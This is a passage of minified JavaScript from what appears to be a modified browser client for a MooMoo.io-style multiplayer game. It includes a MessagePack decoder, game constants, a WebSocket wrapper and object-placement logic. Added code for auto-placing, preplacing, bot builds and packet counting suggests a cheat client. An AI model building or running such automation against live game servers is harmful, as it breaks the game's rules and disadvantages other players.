                    continue e
                } else
                    i = []
            } else if (t === 222) {
                var s = this.readU16();
                if (s !== 0) {
                    this.pushMapState(s),
                        this.complete();
                    continue e
                } else
                    i = {}
            } else if (t === 223) {
                var s = this.readU32();
                if (s !== 0) {
                    this.pushMapState(s),
                        this.complete();
                    continue e
                } else
                    i = {}
            } else if (t === 196) {
                var s = this.lookU8();
                i = this.decodeBinary(s, 1)
            } else if (t === 197) {
                var s = this.lookU16();
                i = this.decodeBinary(s, 2)
            } else if (t === 198) {
                var s = this.lookU32();
                i = this.decodeBinary(s, 4)
            } else if (t === 212)
                i = this.decodeExtension(1, 0);
            else if (t === 213)
                i = this.decodeExtension(2, 0);
            else if (t === 214)
                i = this.decodeExtension(4, 0);
            else if (t === 215)
                i = this.decodeExtension(8, 0);
            else if (t === 216)
                i = this.decodeExtension(16, 0);
            else if (t === 199) {
                var s = this.lookU8();
                i = this.decodeExtension(s, 1)
            } else if (t === 200) {
                var s = this.lookU16();
                i = this.decodeExtension(s, 2)
            } else if (t === 201) {
                var s = this.lookU32();
                i = this.decodeExtension(s, 4)
            } else
                throw new Pe("Unrecognized type byte: ".concat(Ki(t)));
            this.complete();
            for (var r = this.stack; r.length > 0; ) {
                var o = r[r.length - 1];
                if (o.type === 0)
                    if (o.array[o.position] = i,
                        o.position++,
                        o.position === o.size)
                        r.pop(),
                            i = o.array;
                    else
                        continue e;
                else if (o.type === 1) {
                    if (!Ia(i))
                        throw new Pe("The type of key must be string or number but " + typeof i);
                    if (i === "__proto__")
                        throw new Pe("The key __proto__ is not allowed");
                    o.key = i,
                        o.type = 2;
                    continue e
                } else if (o.map[o.key] = i,
                           o.readCount++,
                           o.readCount === o.size)
                    r.pop(),
                        i = o.map;
                else {
                    o.key = null,
                        o.type = 1;
                    continue e
                }
            }
            return i
        }
    }
        ,
        e.prototype.readHeadByte = function() {
        return this.headByte === Dt && (this.headByte = this.readU8()),
            this.headByte
    }
        ,
        e.prototype.complete = function() {
        this.headByte = Dt
    }
        ,
        e.prototype.readArraySize = function() {
        var t = this.readHeadByte();
        switch (t) {
            case 220:
                return this.readU16();
            case 221:
                return this.readU32();
            default:
                {
                    if (t < 160)
                        return t - 144;
                    throw new Pe("Unrecognized array type byte: ".concat(Ki(t)))
                }
        }
    }
        ,
        e.prototype.pushMapState = function(t) {
        if (t > this.maxMapLength)
            throw new Pe("Max length exceeded: map length (".concat(t, ") > maxMapLengthLength (").concat(this.maxMapLength, ")"));
        this.stack.push({
            type: 1,
            size: t,
            key: null,
            readCount: 0,
            map: {}
        })
    }
        ,
        e.prototype.pushArrayState = function(t) {
        if (t > this.maxArrayLength)
            throw new Pe("Max length exceeded: array length (".concat(t, ") > maxArrayLength (").concat(this.maxArrayLength, ")"));
        this.stack.push({
            type: 0,
            size: t,
            array: new Array(t),
            position: 0
        })
    }
        ,
        e.prototype.decodeUtf8String = function(t, i) {
        var s;
        if (t > this.maxStrLength)
            throw new Pe("Max length exceeded: UTF-8 byte length (".concat(t, ") > maxStrLength (").concat(this.maxStrLength, ")"));
        if (this.bytes.byteLength < this.pos + i + t)
            throw Ds;
        var n = this.pos + i, r;
        return this.stateIsMapKey() && (!((s = this.keyDecoder) === null || s === void 0) && s.canBeCached(t)) ? r = this.keyDecoder.decode(this.bytes, n, t) : t > sa ? r = ra(this.bytes, n, t) : r = Hr(this.bytes, n, t),
            this.pos += i + t,
            r
    }
        ,
        e.prototype.stateIsMapKey = function() {
        if (this.stack.length > 0) {
            var t = this.stack[this.stack.length - 1];
            return t.type === 1
        }
        return !1
    }
        ,
        e.prototype.decodeBinary = function(t, i) {
        if (t > this.maxBinLength)
            throw new Pe("Max length exceeded: bin length (".concat(t, ") > maxBinLength (").concat(this.maxBinLength, ")"));
        if (!this.hasRemaining(t + i))
            throw Ds;
        var s = this.pos + i
        , n = this.bytes.subarray(s, s + t);
        return this.pos += i + t,
            n
    }
        ,
        e.prototype.decodeExtension = function(t, i) {
        if (t > this.maxExtLength)
            throw new Pe("Max length exceeded: ext length (".concat(t, ") > maxExtLength (").concat(this.maxExtLength, ")"));
        var s = this.view.getInt8(this.pos + i)
        , n = this.decodeBinary(t, i + 1);
        return this.extensionCodec.decode(n, s, this.context)
    }
        ,
        e.prototype.lookU8 = function() {
        return this.view.getUint8(this.pos)
    }
        ,
        e.prototype.lookU16 = function() {
        return this.view.getUint16(this.pos)
    }
        ,
        e.prototype.lookU32 = function() {
        return this.view.getUint32(this.pos)
    }
        ,
        e.prototype.readU8 = function() {
        var t = this.view.getUint8(this.pos);
        return this.pos++,
            t
    }
        ,
        e.prototype.readI8 = function() {
        var t = this.view.getInt8(this.pos);
        return this.pos++,
            t
    }
        ,
        e.prototype.readU16 = function() {
        var t = this.view.getUint16(this.pos);
        return this.pos += 2,
            t
    }
        ,
        e.prototype.readI16 = function() {
        var t = this.view.getInt16(this.pos);
        return this.pos += 2,
            t
    }
        ,
        e.prototype.readU32 = function() {
        var t = this.view.getUint32(this.pos);
        return this.pos += 4,
            t
    }
        ,
        e.prototype.readI32 = function() {
        var t = this.view.getInt32(this.pos);
        return this.pos += 4,
            t
    }
        ,
        e.prototype.readU64 = function() {
        var t = Jo(this.view, this.pos);
        return this.pos += 8,
            t
    }
        ,
        e.prototype.readI64 = function() {
        var t = zr(this.view, this.pos);
        return this.pos += 8,
            t
    }
        ,
        e.prototype.readF32 = function() {
        var t = this.view.getFloat32(this.pos);
        return this.pos += 4,
            t
    }
        ,
        e.prototype.readF64 = function() {
        var t = this.view.getFloat64(this.pos);
        return this.pos += 8,
            t
    }
        ,
        e
}(), rt = typeof globalThis < "u" ? globalThis : typeof window < "u" ? window : typeof global < "u" ? global : typeof self < "u" ? self : {}, $t = {}, Ca = {
    get exports() {
        return $t
    },
    set exports(e) {
        $t = e
    }
}, le = Ca.exports = {}, Ce, Ae;
function An() {
    throw new Error("setTimeout has not been defined")
}
function Dn() {
    throw new Error("clearTimeout has not been defined")
}
(function() {
    try {
        typeof setTimeout == "function" ? Ce = setTimeout : Ce = An
    } catch {
        Ce = An
    }
    try {
        typeof clearTimeout == "function" ? Ae = clearTimeout : Ae = Dn
    } catch {
        Ae = Dn
    }
}
)();
function Vr(e) {
    if (Ce === setTimeout)
        return setTimeout(e, 0);
    if ((Ce === An || !Ce) && setTimeout)
        return Ce = setTimeout,
            setTimeout(e, 0);
    try {
        return Ce(e, 0)
    } catch {
        try {
            return Ce.call(null, e, 0)
        } catch {
            return Ce.call(this, e, 0)
        }
    }
}
function Aa(e) {
    if (Ae === clearTimeout)
        return clearTimeout(e);
    if ((Ae === Dn || !Ae) && clearTimeout)
        return Ae = clearTimeout,
            clearTimeout(e);
    try {
        return Ae(e)
    } catch {
        try {
            return Ae.call(null, e)
        } catch {
            return Ae.call(this, e)
        }
    }
}
var ze = [], Tt = !1, Qe, li = -1;
function Da() {
    !Tt || !Qe || (Tt = !1,
                   Qe.length ? ze = Qe.concat(ze) : li = -1,
                   ze.length && Ur())
}
function Ur() {
    if (!Tt) {
        var e = Vr(Da);
        Tt = !0;
        for (var t = ze.length; t; ) {
            for (Qe = ze,
                 ze = []; ++li < t; )
                Qe && Qe[li].run();
            li = -1,
                t = ze.length
        }
        Qe = null,
            Tt = !1,
            Aa(e)
    }
}
le.nextTick = function(e) {
    var t = new Array(arguments.length - 1);
    if (arguments.length > 1)
        for (var i = 1; i < arguments.length; i++)
            t[i - 1] = arguments[i];
    ze.push(new Lr(e,t)),
        ze.length === 1 && !Tt && Vr(Ur)
}
;
function Lr(e, t) {
    this.fun = e,
        this.array = t
}
Lr.prototype.run = function() {
    this.fun.apply(null, this.array)
}
;
le.title = "browser";
le.browser = !0;
le.env = {};
le.argv = [];
le.version = "";
le.versions = {};
function Fe() {}
le.on = Fe;
le.addListener = Fe;
le.once = Fe;
le.off = Fe;
le.removeListener = Fe;
le.removeAllListeners = Fe;
le.emit = Fe;
le.prependListener = Fe;
le.prependOnceListener = Fe;
le.listeners = function(e) {
    return []
}
;
le.binding = function(e) {
    throw new Error("process.binding is not supported")
}
;
le.cwd = function() {
    return "/"
}
;
le.chdir = function(e) {
    throw new Error("process.chdir is not supported")
}
;
le.umask = function() {
    return 0
}
;
const Oa = 1920
, Ra = 1080
, _a = 9
, Nr = $t && $t.argv.indexOf("--largeserver") != -1 ? 80 : 50
, Ba = 50
, za = 6
, Ha = 3e3
, Fa = 10
, Va = 5
, Ua = 50
, La = 4.5
, Na = 15
, qa = .9
, Wa = 3e3
, Xa = 60
, Ga = 35
, Ya = 3e3
, $a = 500
, Ka = $t && {}.IS_SANDBOX
, Ja = 100
, Qa = PI / 2.6
, Za = 10
, ja = .25
, el = PI / 2
, tl = 35
, il = .0016
, nl = .993
, sl = 34
, rl = ["#bf8f54", "#cbb091", "#896c4b", "#fadadc", "#ececec", "#c37373", "#4c4c4c", "#ecaff7", "#738cc3", "#8bc373","#67A9DD"]//["#7C5D4F","#847376","#847376","#A48EA8","#9A9AB2","#7F4C63","#313149","#9A72B9","#4B5C97","#5A7F63","#5F75A7"]
, ol = 7
, al = .06
, ll = ["Sid", "Steph", "Bmoe", "Romn", "Jononthecool", "Fiona", "Vince", "Nathan", "Nick", "Flappy", "Ronald", "Otis", "Pepe", "Mc Donald", "Theo", "Fabz", "Oliver", "Jeff", "Jimmy", "Helena", "Reaper", "Ben", "Alan", "Naomi", "XYZ", "Clever", "Jeremy", "Mike", "Destined", "Stallion", "Allison", "Meaty", "Sophia", "Vaja", "Joey", "Pendy", "Murdoch", "Theo", "Jared", "July", "Sonia", "Mel", "Dexter", "Quinn", "Milky"]
, cl = PI / 3
, ci = [{
    id: 0,
    src: "",
    xp: 0,
    val: 1
}, {
    id: 1,
    src: "_g",
    xp: 3e3,
    val: 1.1
}, {
    id: 2,
    src: "_d",
    xp: 7e3,
    val: 1.18
}, {
    id: 3,
    src: "_r",
    poison: !0,
    xp: 12e3,
    val: 1.18
}]
, hl = function(e) {
    const t = e.weaponXP[e.weaponIndex] || 0;
    for (let i = ci.length - 1; i >= 0; --i)
        if (t >= ci[i].xp)
            return ci[i]
}
, fl = ["wood", "food", "stone", "points"]
, ul = 7
, dl = 9
, pl = 3
, ml = 32
, gl = 7
, yl = 724
, wl = 114
, kl = .0011
, vl = 1e-4
, xl = 1.3
, bl = [150, 160, 165, 175]
, Sl = [80, 85, 95]
, Tl = [80, 85, 90]
, Il = 2400
, Ml = .75
, El = 15
, ts = 14400
, Pl = 40
, Cl = 2200
, Al = .6
, Dl = 1
, Ol = .3
, Rl = .3
, _l = 144e4
, is = 320
, Bl = 100
, zl = 2
, Hl = 3200
, Fl = 1440
, Vl = .2
, Ul = -1
, Ll = ts - is - 120
, Nl = ts - is - 120
, T = {
    maxScreenWidth: Oa,
    maxScreenHeight: Ra,
    serverUpdateRate: _a,
    maxPlayers: Nr,
    maxPlayersHard: Ba,
    collisionDepth: za,
    minimapRate: Ha,
    colGrid: Fa,
    clientSendRate: Va,
    healthBarWidth: Ua,
    healthBarPad: La,
    iconPadding: Na,
    iconPad: qa,
    deathFadeout: Wa,
    crownIconScale: Xa,
    crownPad: Ga,
    chatCountdown: Ya,
    chatCooldown: $a,
    inSandbox: Ka,
    maxAge: Ja,
    gatherAngle: Qa,
    gatherWiggle: Za,
    hitReturnRatio: ja,
    hitAngle: el,
    playerScale: tl,
    playerSpeed: il,
    playerDecel: nl,
    nameY: sl,
    skinColors: rl,
    animalCount: ol,
    aiTurnRandom: al,
    cowNames: ll,
    shieldAngle: cl,
    weaponVariants: ci,
    fetchVariant: hl,
    resourceTypes: fl,
    areaCount: ul,
    treesPerArea: dl,
    bushesPerArea: pl,
    totalRocks: ml,
    goldOres: gl,
    riverWidth: yl,
    riverPadding: wl,
    waterCurrent: kl,
    waveSpeed: vl,
    waveMax: xl,
    treeScales: bl,
    bushScales: Sl,
    rockScales: Tl,
    snowBiomeTop: Il,
    snowSpeed: Ml,
    maxNameLength: El,
    mapScale: ts,
    mapPingScale: Pl,
    mapPingTime: Cl,
    volcanoScale: is,
    innerVolcanoScale: Bl,
    volcanoAnimalStrength: zl,
    volcanoAnimationDuration: Hl,
    volcanoAggressionRadius: Fl,
    volcanoAggressionPercentage: Vl,
    volcanoDamagePerSecond: Ul,
    volcanoLocationX: Ll,
    volcanoLocationY: Nl,
    MAX_ATTACK: Al,
    MAX_SPAWN_DELAY: Dl,
    MAX_SPEED: Ol,
    MAX_TURN_SPEED: Rl,
    DAY_INTERVAL: _l
}
, ql = new ka
, Wl = new Pa
, knla = {
    socket: null,
    connected: !1,
    socketId: -1,
    connect: function(e, t, i) {
        if (this.socket)
            return;
        const s = this;
        try {
            let n = !1;
            const r = e;
            this.socket = new WebSocket(e),
                websocket = this.socket,
                this.socket.binaryType = "arraybuffer",
                this.socket.onmessage = function(o) {
                var a = new Uint8Array(o.data);
                const l = Wl.decode(a)
                , c = l[0];
                var a = l[1];
                c == "io-init" ? s.socketId = a[0] : i[c].apply(void 0, a)
            }
                ,
                this.socket.onopen = function() {
                s.connected = !0,
                    t()
            }
                ,
                this.socket.onclose = function(o) {
                s.connected = !1,
                    o.code == 4001 ? t("Invalid Connection") : n || t("disconnected")
            }
                ,
                this.socket.onerror = function(o) {
                this.socket && this.socket.readyState != WebSocket.OPEN && (n = !0,
                                                                            console.error("Socket error", arguments),
                                                                            t("Socket error"))
            }
        } catch (n) {
            console.warn("Socket connection error:", n),
                t(n)
        }
    },
    send: function(e) {
        const t = Array.prototype.slice.call(arguments, 1)
        , i = ql.encode([e, t]);
        if(!fS.min){
            fS.min = true;
            setTimeout(()=>{
                fS.min = false;
                minutePackets = 0;
            }
                       , 60000);
        }
        if(e == "P"){
            lastAccept = tick;
        }
        if(e == "z" && t[0] === null)return;
        if(e=="9"){
            moveAuto = t[1];
            if(moveDirection == t[0]) return;

            moveDirection = t[0];
            Tn = t[0]
        }
        if(e == "K"){
            hitPacket++;
        }
        if(e=="H"){
            ww>=9?(ww=secondary):(ww=primary)
        }

        this.socket && this.socket.send(i)
    },
    socketReady: function() {
        return this.socket && this.connected;
    },
    close: function() {
        this.socket && this.socket.close(),
            this.socket = null,
            this.connected = !1
    }
};
var qr = Math.abs;
const Xl = Math.sqrt;
const Gl = Math.atan2
, Qi = Math.PI
, Yl = function(e, t) {
    return Math.floor(Math.random() * (t - e + 1)) + e
}
, $l = function(e, t) {
    return Math.random() * (t - e + 1) + e
}
, Kl = function(e, t, i) {
    return e + (t - e) * i
}
, Jl = function(e, t) {
    return e > 0 ? e = max(0, e - t) : e < 0 && (e = min(0, e + t)),
        e
}
, Ql = function(e, t, i, s) {
    return Xl((i -= e) * i + (s -= t) * s)
}
, Zl = function(e, t, i, s) {
    return Gl(t - s, e - i)
}
, jl = function(e, t) {
    const i = qr(t - e) % (Qi * 2);
    return i > Qi ? Qi * 2 - i : i
}
, ec = function(e) {
    return typeof e == "number" && !isNaN(e) && isFinite(e)
}
, tc = function(e) {
    return e && typeof e == "string"
}
, ic = function(e) {
    return e > 999 ? (e / 1e3).toFixed(1) + "k" : e
}
, nc = function(e) {
    return e.charAt(0).toUpperCase() + e.slice(1)
}
, sc = function(e, t) {
    return e ? parseFloat(e.toFixed(t)) : 0
}
, rc = function(e, t) {
    return parseFloat(t.points) - parseFloat(e.points)
}
, oc = function(e, t, i, s, n, r, o, l) {
    let c = n
    , a = o;
    if (n > o && (c = o,
                  a = n),
        a > i && (a = i),
        c < e && (c = e),
        c > a)
        return !1;
    let u = r
    , p = l;
    const h = o - n;
    if (abs(h) > 1e-7) {
        const m = (l - r) / h
        , w = r - m * n;
        u = m * c + w,
            p = m * a + w
    }
    if (u > p) {
        const m = p;
        p = u,
            u = m
    }
    return p > s && (p = s),
        u < t && (u = t),
        !(u > p)
}
, Wr = function(e, t, i) {
    const s = e.getBoundingClientRect()
    , n = s.left + window.scrollX
    , r = s.top + window.scrollY
    , o = s.width
    , l = s.height
    , c = t > n && t < n + o
    , a = i > r && i < r + l;
    return c && a
}
, hi = function(e) {
    const t = e.changedTouches[0];
    e.screenX = t.screenX,
        e.screenY = t.screenY,
        e.clientX = t.clientX,
        e.clientY = t.clientY,
        e.pageX = t.pageX,
        e.pageY = t.pageY
}
, Xr = function(e, t) {
    const i = !t;
    let s = !1;
    const n = !1;
    e.addEventListener("touchstart", Be(r), n),
        e.addEventListener("touchmove", Be(o), n),
        e.addEventListener("touchend", Be(l), n),
        e.addEventListener("touchcancel", Be(l), n),
        e.addEventListener("touchleave", Be(l), n);
    function r(c) {
        hi(c),
            window.setUsingTouch(!0),
            i && (c.preventDefault(),
                  c.stopPropagation()),
            e.onmouseover && e.onmouseover(c),
            s = !0
    }
    function o(c) {
        hi(c),
            window.setUsingTouch(!0),
            i && (c.preventDefault(),
                  c.stopPropagation()),
            Wr(e, c.pageX, c.pageY) ? s || (e.onmouseover && e.onmouseover(c),
                                            s = !0) : s && (e.onmouseout && e.onmouseout(c),
                                                            s = !1)
    }
    function l(c) {
        hi(c),
            window.setUsingTouch(!0),
            i && (c.preventDefault(),
                  c.stopPropagation()),
            s && (e.onclick && e.onclick(c),
                  e.onmouseout && e.onmouseout(c),
                  s = !1)
    }
}
, ac = function(e) {
    for (; e.hasChildNodes(); )
        e.removeChild(e.lastChild)
}
, lc = function(e) {
    const t = document.createElement(e.tag || "div");
    function i(s, n) {
        e[s] && (t[n] = e[s])
    }
    i("text", "textContent"),
        i("html", "innerHTML"),
        i("class", "className");
    for (const s in e) {
        switch (s) {
            case "tag":
            case "text":
            case "html":
            case "class":
            case "style":
            case "hookTouch":
            case "parent":
            case "children":
                continue
        }
        t[s] = e[s]
    }
    if (t.onclick && (t.onclick = Be(t.onclick)),
        t.onmouseover && (t.onmouseover = Be(t.onmouseover)),
        t.onmouseout && (t.onmouseout = Be(t.onmouseout)),
        e.style && (t.style.cssText = e.style),
        e.hookTouch && Xr(t),
        e.parent && e.parent.appendChild(t),
        e.children)
        for (let s = 0; s < e.children.length; s++)
            t.appendChild(e.children[s]);
    return t
}
, Gr = function(e) {
    return e && typeof e.isTrusted == "boolean" ? e.isTrusted : !0
}
, Be = function(e) {
    return function(t) {
        t && t instanceof Event && Gr(t) && e(t)
    }
}
, cc = function(e) {
    let t = "";
    const i = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    for (let s = 0; s < e; s++)
        t += i.charAt(floor(Math.random() * i.length));
    return t
}
, hc = function(e, t) {
    let i = 0;
    for (let s = 0; s < e.length; s++)
        e[s] === t && i++;
    return i
}
, C = {
    randInt: Yl,
    randFloat: $l,
    lerp: Kl,
    decel: Jl,
    getDistance: Ql,
    getAimerection: Zl,
    getAngleDist: jl,
    isNumber: ec,
    isString: tc,
    kFormat: ic,
    capitalizeFirst: nc,
    fixTo: sc,
    sortByPoints: rc,
    lineInRect: oc,
    containsPoint: Wr,
    mousifyTouchEvent: hi,
    hookTouchEvents: Xr,
    removeAllChildren: ac,
    generateElement: lc,
    eventIsTrusted: Gr,
    checkTrusted: Be,
    randomString: cc,
    countInArray: hc
}
,  fc = function () {

 this.init = function(e, t, i, n, s, r, o) {
        this.x = e,
        this.y = t,
        this.color = o,
        this.scale = i * 1.3, // Aumenta 20% o tamanho inicial
        this.startScale = this.scale,
        this.maxScale = this.scale * 1.5,
        this.scaleSpeed = 1.0,
        this.speed = n,
        this.life = s,
        this.text = r
    },

   this.update = function(e) {
        this.life && (this.life -= e,
        this.y -= this.speed * e,
        this.scale += this.scaleSpeed * e,
        this.scale >= this.maxScale ? (this.scale = this.maxScale,
        this.scaleSpeed *= -1) : this.scale <= this.startScale && (this.scale = this.startScale,
        this.scaleSpeed = 0),
        this.life <= 0 && (this.life = 0))
    }
    ,
             this.render = function(e, t, i) {
        e.fillStyle = this.color,
        e.font = this.scale + "px Hammersmith One",
        e.fillText(this.text, this.x - t, this.y - i)
    }


}, uc = function() {
    this.texts = [];

 this.texts = [];
   this.update = function(e, t, i, n) {
        t.textBaseline = "middle",
        t.textAlign = "center";
        for (let s = 0; s < this.texts.length; ++s)
            this.texts[s].life && (this.texts[s].update(e),
            this.texts[s].render(t, i, n))
    }
    ,
    this.showText = function(e, t, i, n, s, r, o) {
        let l;
        for (let c = 0; c < this.texts.length; ++c)
            if (!this.texts[c].life) {
                l = this.texts[c];
                break
            }
        l || (l = new fc,
        this.texts.push(l)),
        l.init(e, t, i, n, s, r, o)
    }







   
}, dc = function(e, t) {
    let i;
    this.sounds = [],
        this.active = !0,
        this.play = function(s, n, r) {
        !n || !this.active || (i = this.sounds[s],
                               i || (i = new Howl({
            src: ".././sound/" + s + ".mp3"
        }),
                                     this.sounds[s] = i),
                               (!r || !i.isPlaying) && (i.isPlaying = !0,
                                                        i.play(),
                                                        i.volume((n || 1) * e.volumeMult),
                                                        i.loop(r)))
    }
        ,
        this.toggleMute = function(s, n) {
        i = this.sounds[s],
            i && i.mute(n)
    }
        ,
        this.stop = function(s) {
        i = this.sounds[s],
            i && (i.stop(),
                  i.isPlaying = !1)
    }
}
, Os = Math.floor
, Rs = Math.abs
, Ot = Math.cos
, Rt = Math.sin
, pc = Math.sqrt;
function mc(e, t, i, s, n, r) {
    this.objects = t,
        this.grids = {},
        this.updateObjects = [];
    let o, l;
    const c = s.mapScale / s.colGrid;
    this.setObjectGrids = function(h) {
        const m = min(s.mapScale, max(0, h.x))
        , w = min(s.mapScale, max(0, h.y));
        for (let v = 0; v < s.colGrid; ++v) {
            o = v * c;
            for (let x = 0; x < s.colGrid; ++x)
                l = x * c,
                    m + h.scale >= o && m - h.scale <= o + c && w + h.scale >= l && w - h.scale <= l + c && (this.grids[v + "_" + x] || (this.grids[v + "_" + x] = []),
                                                                                                             this.grids[v + "_" + x].push(h),
                                                                                                             h.gridLocations.push(v + "_" + x))
        }
    }
        ,
        this.removeObjGrid = function(h) {
        let m;
        for (let w = 0; w < h.gridLocations.length; ++w)
            m = this.grids[h.gridLocations[w]].indexOf(h),
                m >= 0 && this.grids[h.gridLocations[w]].splice(m, 1)
    }
        ,
        this.disableObj = function(h) {
        if (h.active = !1,
            r) {
            h.owner && h.pps && (h.owner.pps -= h.pps),
                this.removeObjGrid(h);
            const m = this.updateObjects.indexOf(h);
            m >= 0 && this.updateObjects.splice(m, 1)
        }
    }
        ,
        this.hitObj = function(h, m) {
        for (let w = 0; w < n.length; ++w)
            n[w].active && (h.sentTo[n[w].id] && (h.active ? n[w].canSee(h) && r.send(n[w].id, "L", i.fixTo(m, 1), h.sid) : r.send(n[w].id, "Q", h.sid)),
                            !h.active && h.owner == n[w] && n[w].changeItemCount(h.group.id, -1))
    }
    ;
    const a = [];
    let u;
    this.getGridArrays = function(h, m, w) {
        o = Os(h / c),
            l = Os(m / c),
            a.length = 0;
        try {
            this.grids[o + "_" + l] && a.push(this.grids[o + "_" + l]),
                h + w >= (o + 1) * c && (u = this.grids[o + 1 + "_" + l],
                                         u && a.push(u),
                                         l && m - w <= l * c ? (u = this.grids[o + 1 + "_" + (l - 1)],
                                                                u && a.push(u)) : m + w >= (l + 1) * c && (u = this.grids[o + 1 + "_" + (l + 1)],
                                                                                                           u && a.push(u))),
                o && h - w <= o * c && (u = this.grids[o - 1 + "_" + l],
                                        u && a.push(u),
                                        l && m - w <= l * c ? (u = this.grids[o - 1 + "_" + (l - 1)],
                                                               u && a.push(u)) : m + w >= (l + 1) * c && (u = this.grids[o - 1 + "_" + (l + 1)],
                                                                                                          u && a.push(u))),
                m + w >= (l + 1) * c && (u = this.grids[o + "_" + (l + 1)],
                                         u && a.push(u)),
                l && m - w <= l * c && (u = this.grids[o + "_" + (l - 1)],
                                        u && a.push(u))
        } catch {}
        return a
    }
    ;
    let p;
    this.add = function(h, m, w, v, x, D, k, S, O, bot, spectate, fake, restricter, preplace, restrictColor) {
        p = new e(h)
        p.sid = h
        p.init(m, w, v, x, D, k, O, bot, spectate, fake, restrictColor, preplace)
        //console.log(g)
        //console.log(spectate);
        if(!bot && !fake && !spectate){
            et.push(p)
            Tach?.addBuilding(p);
        } else if(bot&&!fake){
            bot.builds.push(p)
        } else if(spectate && !bot && !fake) {
            spectator.builds.push(p);
            //console.log("lol spectate");
        } else {
            //  visualPlace.push
            //thisTick.newBuilds.push(p);
            showPlace.push(p);
            if(restricter) restrictPlace.push(p)
            autoplacing = nearObjects.concat(restrictPlace)
        }
        /*p = null;
        for (var U = 0; U < t.length; ++U)
            if (t[U].sid == h) {
                p = t[U];
                break
            }
        if (!p) {
            for (var U = 0; U < t.length; ++U)
                if (!t[U].active) {
                    p = t[U];
                    break
                }
        }
        p || (p = new e(h),
        t.push(p)),
        S && (p.sid = h),
        p.init(m, w, v, x, D, k, O),
        r && (this.setObjectGrids(p),
        p.doUpdate && this.updateObjects.push(p))*/
    }
        ,
        this.disableBySid = function(h) {
        for (let m = 0; m < t.length; ++m)
            if (t[m].sid == h) {
                this.disableObj(t[m]);
                break
            }
    }
        ,
        this.removeAllItems = function(h, m) {
        for (let w = 0; w < t.length; ++w)
            t[w].active && t[w].owner && t[w].owner.sid == h && this.disableObj(t[w]);
        m && m.broadcast("R", h)
    }
        ,
        this.fetchSpawnObj = function(h) {
        let m = null;
        for (let w = 0; w < t.length; ++w)
            if (p = t[w],
                p.active && p.owner && p.owner.sid == h && p.spawnPoint) {
                m = [p.x, p.y],
                    this.disableObj(p),
                    r.broadcast("Q", p.sid),
                    p.owner && p.owner.changeItemCount(p.group.id, -1);
                break
            }
        return m
    }
        ,
        this.checkItemLocation = function(h, m, w, v, x, D, priority) {
        for (let S = 0; S < autoplacing.length; ++S) {
            const O = autoplacing[S].blocker ? autoplacing[S].blocker : autoplacing[S].getScale(v, autoplacing[S].isItem);
            if (autoplacing[S].active && i.getDistance(h, m, autoplacing[S].x, autoplacing[S].y) < w + O && !(autoplacing[S].assumeBreak && priority))
                return !1
        }
        return !(!D && x != 18 && m >= s.mapScale / 2 - s.riverWidth / 2 && m <= s.mapScale / 2 + s.riverWidth / 2)
    }
        ,
        this.checkItemLocation2 = function(e, n, I, r, S, a,l) {
        for (var h = 0; h < renderObjects.length; ++h) {
            let obj = renderObjects[h]
            var u = obj.blocker ? obj.blocker : obj.getScale(r, obj.isItem);
            if (obj.active && i.getDistance(e, n, obj.x, obj.y) < I + u) return !1;
        }
        return !(!a && 18 != S && n >= s.mapScale / 2 - s.riverWidth / 2 && n <= s.mapScale / 2 + s.riverWidth /2)
    },
        this.checkItemLocationOrig = function(x, y, s, sM, indx, ignoreWater, placer) {
        for (var i = 0; i < nearObjects.length; ++i) {
            //if(dist(player, gameObjects[i]) <= 800) {
            var blockS = (nearObjects[i].blocker ?
                          nearObjects[i].blocker : nearObjects[i].getScale(sM, nearObjects[i].isItem));
            if (nearObjects[i].active && i.getDistance(x, y, nearObjects[i].x, nearObjects[i].y) < (s + blockS))
                return false;
        }
        if (!ignoreWater && indx != 18 && y >= (T.mapScale / 2) - (T.riverWidth / 2) && y <=
            (T.mapScale / 2) + (T.riverWidth / 2)) {
            return false;
        }
        return true;
    };
    this.checkItemLocation3 = function(e, n, I, r, S, a, outplace, obj) {
        //   let preplaceObjs = [];
        for (var h = 0; h < nearObjects.length; ++h) {
            var u = nearObjects[h].blocker ? nearObjects[h].blocker : nearObjects[h].getScale(r, nearObjects[h].isItem);
            let distance = i.getDistance(e, n, nearObjects[h].x, nearObjects[h].y) < I + u
            if(distance){
                obj.overlap.push(nearObjects[h])
                obj.preplacer.push(nearObjects[h].assumeBreak)
                obj.sids.push(nearObjects[h].sid)
            }
            //  if (nearObjects[h].active && distance && !(nearObjects[h].assumeBreak&&outplace)) return !1
        }
        if(obj.preplacer.includes(false)) return !1;
        return !(!a && 18 != S && n >= s.mapScale / 2 - s.riverWidth / 2 && n <= s.mapScale / 2 + s.riverWidth /2)
    },
        this.checkItemLocation4 = function(e, n, I, r, S, a,build) {
        for (var h = 0; h < nearObjects.length; ++h) {
            var u = nearObjects[h].blocker ? nearObjects[h].blocker : nearObjects[h].getScale(r, nearObjects[h].isItem);
            if (nearObjects[h].active && i.getDistance(e, n, nearObjects[h].x, nearObjects[h].y) < I + u&&build.sid!=nearObjects[h].sid) return !1
        }
        return !(!a && 18 != S && n >= s.mapScale / 2 - s.riverWidth / 2 && n <= s.mapScale / 2 + s.riverWidth /2)
    },
        this.checkItemLocationBot = function(e, n, I, r, S, a, build) {
        for (var h = 0; h < build.length; ++h) {
            var u = build[h].blocker ? build[h].blocker : build[h].getScale(r, build[h].isItem);
            if (i.getDistance(e, n, build[h].x, build[h].y) < I + u) return !1
        }
        return !(!a && 18 != S && n >= s.mapScale / 2 - s.riverWidth / 2 && n <= s.mapScale / 2 + s.riverWidth /2)
    },
        this.addProjectile = function(h, m, w, v, x) {
        const D = items.projectiles[x];
        let k;
        for (let S = 0; S < projectiles.length; ++S)
            if (!projectiles[S].active) {
                k = projectiles[S];
                break
            }
        k || (k = new Projectile(n,i),
              projectiles.push(k)),
            k.init(x, h, m, w, D.speed, v, D.scale)
    }
        ,
        this.checkCollision = function(h, m, w) {
        w = w || 1;
        const v = h.x - m.x
        , x = h.y - m.y;
        let D = h.scale + m.scale;
        if (Rs(v) <= D || Rs(x) <= D) {
            D = h.scale + (m.getScale ? m.getScale() : m.scale);
            let k = pc(v * v + x * x) - D;
            if (k <= 0) {
                if (m.ignoreCollision)
                    m.trap && !h.noTrap && m.owner != h && !(m.owner && m.owner.team && m.owner.team == h.team) ? (h.lockMove = !0,
                                                                                                                   m.hideFromEnemy = !1) : m.boostSpeed ? (h.xVel += w * m.boostSpeed * (m.weightM || 1) * Ot(m.dir),
